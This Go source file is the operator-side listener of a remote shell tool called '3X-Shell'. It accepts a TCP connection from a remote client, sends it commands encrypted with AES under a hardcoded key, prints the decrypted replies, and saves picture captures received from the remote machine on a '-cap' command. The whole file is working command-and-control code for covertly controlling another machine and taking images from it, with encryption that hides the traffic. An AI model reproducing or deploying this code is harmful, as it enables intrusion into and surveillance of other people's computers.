package main

import (
	"3X-Shell/Servidor/Banner"
	"bufio"
	"encoding/base64"
	"fmt"
	aesgo "github.com/3xploit666/AesGo"
	"github.com/fatih/color"
	"log"
	"net"
	"os"
	"strings"
)

var (
	mensaje string
)

const Key = "34343243434324"

func handleErr(err error, errorLogger *log.Logger) {
	if err != nil {
		errorLogger.Fatal(strings.Title(err.Error()))
	}
}

var logErr *log.Logger = log.New(os.Stdout, "[ERROR] ", log.LstdFlags|log.LUTC|log.Lshortfile)
var InfLog *log.Logger = log.New(os.Stdout, "[INFO] ", log.LstdFlags|log.LUTC|log.Lshortfile)

func main() {

	color.Red(Banner.Baner1)
	color.Blue("v1.0 Mode Beta\n")
	color.Blue("-cap [capture picture]\n")
	color.Blue("Insert Port ")
	leerdatos := bufio.NewScanner(os.Stdin)
	leerdatos.Scan()

	conexion, err := net.Listen("tcp", ":"+leerdatos.Text())
	handleErr(err, logErr)
	defer conexion.Close()
	con, _ := conexion.Accept()

	fmt.Println("[+] Connection established with > ", con.RemoteAddr().String())
	InfLog.Printf("Listening on %v/%v...", conexion.Addr().String(), conexion.Addr().Network())

	for {

		fmt.Print("@3xShell > ")
		leerdatos := bufio.NewReader(os.Stdin)
		command, _ := leerdatos.ReadString('\n')
		con.Write([]byte(aesgo.EncryptAes(command, Key) + "\n"))

		if strings.Index(string(command), "-cap") == 0 {

			mensaje, err := bufio.NewReader(con).ReadString('\n')
			color.Red("received capture!!")
			if err != nil {
				fmt.Println(err)
				continue
			}

			ff, _ := base64.StdEncoding.DecodeString(string(mensaje))

			decoded := aesgo.DecryptAes(string(ff), Key)
			workingDir, err := os.Getwd()
			err = os.WriteFile(workingDir+"\\fotos.png", []byte(decoded), 0644)
			if err != nil {
				fmt.Println(err)

			}

		} else {
			mensaje2, err := bufio.NewReader(con).ReadString('\n')
			if err != nil {
				fmt.Println(err)
				continue
			}
			fmt.Println(aesgo.DecryptAes(mensaje2, Key))

		}

	}

}
